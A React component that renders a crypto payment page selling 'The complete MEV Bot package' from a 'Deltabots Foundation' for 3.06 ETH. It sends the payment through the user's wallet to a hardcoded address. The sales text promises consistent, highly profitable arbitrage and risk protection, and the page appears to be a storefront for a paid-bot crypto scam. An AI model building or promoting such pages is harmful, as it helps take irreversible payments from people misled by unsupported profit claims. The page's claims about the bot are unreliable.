import { useState } from "react";
import { ethers } from "ethers";
import ErrorMessage from "./ErrorMessage";
import TxList from "./TxList";
import './index.css';
import Frame from './frame.jpg';

const startPayment = async ({ setError, setTxs, ether, addr }) => {
  try {
    if (!window.ethereum)
      throw new Error("No crypto wallet found. Please install it.");

    await window.ethereum.send("eth_requestAccounts");
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    const signer = provider.getSigner();
    ethers.utils.getAddress(addr);
    const tx = await signer.sendTransaction({
      to: addr,
      value: ethers.utils.parseEther(ether)
    });
    console.log({ ether, addr });
    console.log("tx", tx);
    setTxs([tx]);
  } catch (err) {
    setError(err.message);
  }
};

export default function App() {
  const [error, setError] = useState();
  const [txs, setTxs] = useState([]);

  const handleSubmit = async (e) => {
    e.preventDefault();
    const data = new FormData(e.target);
    setError();
    await startPayment({
      setError,
      setTxs,
      ether: data.get("ether"),
      addr: data.get("addr")
    });
  };

  return (
    
    <form className="m-4" onSubmit={handleSubmit}>
      <br/>
      <div className="credit-card w-full lg:w-1/2 sm:w-auto shadow-lg mx-auto rounded-xl bg-white">
        <main className="mt-4 p-4">
          <h1 className="fff">
            The complete MEV Bot package (By <a href="#">Deltabots Foundation</a>)
          </h1>
          <br/>
          <h1 class="f">Price: $5,000 (3.06 ETH)</h1>
          <br/>
          <span>This program is able to navigate the complexities of smart contract interactions and exploit inefficiencies in the market, allowing for a consistent generation of profit. Additionally, our bot is equipped with advanced risk management features, which include customizable stop loss and profit taking options, to ensure optimal performance and protection of your capital.</span>
<br/>
<br/>
          <span>Gain access to our complete MEV arbitrage bot suite. Utilizing cutting-edge algorithms, our bot is designed to execute sophisticated arbitrage trades across a diverse array of decentralized finance protocols. With the ability to identify and capitalize on opportunities for MEV (Miner Extractable Value) in real-time, this highly profitable MEV bot program provides an unparalleled edge in the rapidly evolving DeFi markets.</span>
          <br/>
          <div className="">
            <div className="my-3">
              <input
                type="text"
                name="addr"
                className="input input-bordered block w-full focus:ring focus:outline-none"
                value="0xecED404840e7f3F757572cF617633813e98c091a"
              />
            </div>
            <div className="my-3">
              <input
                name="ether"
                type="text"
                className="input input-bordered block w-full focus:ring focus:outline-none"
                value="3.06"
              />
            </div>
          </div>
        </main>
        <footer className="p-4">
          <button
            type="submit"
            className="btn btn-primary submit-button focus:ring focus:outline-none w-full"
          >
            Pay now
          </button>
          <ErrorMessage message={error} />
          <TxList txs={txs} />
        </footer>
      </div>
    </form>
  );
}